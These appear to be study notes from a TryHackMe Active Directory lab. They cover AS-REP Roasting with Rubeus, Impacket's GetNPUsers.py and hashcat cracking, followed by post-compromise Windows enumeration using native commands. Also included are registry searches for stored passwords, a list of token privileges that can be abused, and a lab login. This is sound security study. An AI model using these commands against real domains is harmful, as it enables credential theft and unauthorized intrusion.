# AS-REP Roasting

## What It Is
Similar to Kerberoasting, but targets accounts with Kerberos **pre-authentication disabled** (`UF_DONT_REQUIRE_PREAUTH` flag set). Unlike Kerberoasting, the account does **not** need to be a service account — just needs that flag set.

**How it works:** Normally, a user's hash encrypts a timestamp that the KDC decrypts to verify identity. If pre-auth is disabled, the KDC skips this check and returns an encrypted AS-REP blob without identity verification. That blob can be captured and cracked offline to recover the plaintext password.

## Phase 1: Enumeration — Identifying Vulnerable Accounts
Goal: find accounts with pre-auth disabled, since anyone on the network can request an AS-REP for them without proving identity.

### Rubeus (Windows only)
`Rubeus.exe asreproast`  
Automatically scans AD, identifies vulnerable accounts, and retrieves hashes for offline cracking.

### Impacket's GetNPUsers.py (Linux/Windows)
Requires a `users.txt` file of usernames to test.
```bash
GetNPUsers.py tryhackme.loc/ -dc-ip 10.211.12.10 -usersfile users.txt -format hashcat -outputfile hashes.txt -no-pass
```
- Tests each username in the list for the pre-auth-disabled flag.
- Saves AS-REP hashes of vulnerable accounts to `hashes.txt` (hashcat format).

**Building users.txt on the AttackBox:**
```bash
cat > users.txt
# paste usernames, then Ctrl+D
cat users.txt   # verify
```

Running `GetNPUsers.py` produces output like:  
`[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set`  
`[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set`  
`...`  
Vulnerable accounts yield hashes written to `hashes.txt`.

## Phase 2: Exploitation — Cracking the Hashes
### Hashcat
AS-REP hashes use cracking mode **18200**.
```bash
hashcat -m 18200 hashes.txt wordlist.txt
```
- `-m 18200` — AS-REP Kerberos hash mode
- `hashes.txt` — collected hashes
- `wordlist.txt` — dictionary (e.g., `/usr/share/wordlists/rockyou.txt`)

Example crack (redacted):  
`$krb5asrep$23$asrepuser1@TRYHACKME.LOC:...:[PASSWORD REDACTED]`  

**After cracking:** the plaintext password can be used to authenticate as the compromised user, request further Kerberos tickets, or access other network resources.

## Mitigations
- Enforce Kerberos pre-authentication for all accounts.
- Use strong, complex passwords to slow offline cracking.
- Monitor for anomalous AS-REP requests at the KDC.

## Key Takeaways
- AS-REP Roasting is a **low-noise, unauthenticated** Kerberos attack.
- Rubeus simplifies discovery on Windows; `GetNPUsers.py` gives manual control on Linux.
- Success hinges on password strength and whether pre-auth enforcement is properly configured.

# Manual Windows Host Enumeration (CMD/PowerShell — Living Off The Land)

## Context
After landing a shell on a Windows box, use native CMD/PowerShell commands (no extra tooling) to enumerate identity, privileges, users/groups, sessions, services, and system config. This blends in with normal admin activity — "Living Off The Land" (LOTL).

**Access example (SSH to workstation):**  
`ssh asrepuser1@10.211.12.20`  
creds: `asrepuser1 / qwerty123!`  

Prompt format `tryhackme\asrepuser1@WRK` shows domain\user @ hostname.

## Who Am I?
```cmd
whoami
```
Shows domain/user or computer/local-user context.

```cmd
whoami /all
```
Returns:
- User SID
- Group memberships (check for Administrators, Domain Users, Backup Operators, etc.)
- Privileges list

### High-Value Privileges to Check
| Privilege | Significance |
|---|---|
| `SeImpersonatePrivilege` | Impersonate another authenticated user's token; basis of "potato" attacks → potential SYSTEM shell |
| `SeAssignPrimaryTokenPrivilege` | Assign another user's primary token to a new process (used with SeImpersonate) |
| `SeBackupPrivilege` | Read any file ignoring permissions — can dump SAM/SYSTEM hives |
| `SeRestorePrivilege` | Write any file/registry key ignoring permissions — can overwrite critical files |
| `SeDebugPrivilege` | Attach debugger to any process — enables LSASS dumping for credential extraction |

## System & Domain Info
```cmd
hostname                 :: prints computer name (often hints at role, e.g. "dc", "pc01")
systeminfo                :: full OS/hotfix/domain info (requires admin)
systeminfo | findstr /B "OS"       :: filter OS info
systeminfo | findstr /B "Domain"   :: filter domain membership
set                        :: environment variables (CMD)
Get-ChildItem Env:  /  dir env:    :: environment variables (PowerShell)
```
Note: `USERDOMAIN` = computer name unless domain-joined.

## Enumerating Users & Groups (NET commands)
`net help` lists all available NET subcommands. Blends in as normal admin activity.

### Domain Users
```cmd
net user /domain                    :: list all domain users
net user <username> /domain         :: detailed info (status, password dates, group memberships, last logon)
```

### Domain Groups
```cmd
net group /domain                   :: list all domain groups
net group "<Group Name>" /domain    :: list members of a specific group (e.g. "Domain Computers", "Domain Admins")
```
**Interesting groups to inspect:** Domain Admins, Administrators, Enterprise Admins, Server Operators, Backup Operators, and any group with "Admin" in its name.

Machine accounts appear with a trailing `$` (e.g., `DESKTOP-ACCT05$`) — found via `net group "Domain Computers" /domain`.

### Local Groups
```cmd
net localgroup                      :: list local groups
net localgroup administrators       :: list members of local Administrators group
```

## Logged-On Users & Sessions
```cmd
quser  (or: query user)             :: shows logged-on users, session state, logon time
tasklist                            :: running processes (verbose: tasklist /V)
net session                         :: SMB sessions with other machines (requires admin)
```
A logged-on **Administrator** account is a high-value target — potential for LSASS dumping (credentials/tickets) or token impersonation (if `SeImpersonatePrivilege` is held).

Users who've logged in at least once can also be identified via home directories under `C:\Users\`.

## Identifying Service Accounts
Service accounts run applications/services, often with elevated privileges and static (non-expiring) passwords.

### WMIC
```cmd
wmic service get Name,StartName     :: requires admin
```
PowerShell equivalent:
```powershell
Get-WmiObject Win32_Service | select Name, StartName
```
Standard accounts: `LocalSystem`, `NT AUTHORITY\LocalService`, `NT AUTHORITY\NetworkService`, `NT SERVICE\<name>`. A domain account (`DomainName\username`) running a service is worth investigating — may be reused elsewhere or have a weaker password.

### SC (Service Control)
```cmd
sc query state= all                 :: list all services (requires admin)
sc query state= all | find "Keyword" :: filter
sc qc <ServiceName>                 :: query specific service config, shows SERVICE_START_NAME
```

## Environment Variables & Registry

### Environment Variables
`set` output can reveal installed software/tools via variables like `JAVA_HOME`.

### Saved Auto-Logon Credentials
```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```
Check `DefaultPassword` (plaintext if saved) and `AutoAdminLogon` (=1 if enabled).

Also check `HKLM\Security\Cache` (requires admin; hashed, needs cracking).

### Installed Applications
```cmd
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### General Registry Search
```cmd
reg query HKLM /f "password" /t REG_SZ /s
```

## Scheduled Tasks
```cmd
schtasks /query          :: list scheduled tasks
schtasks /create ...      :: create new task
schtasks /run ...         :: run existing task
```
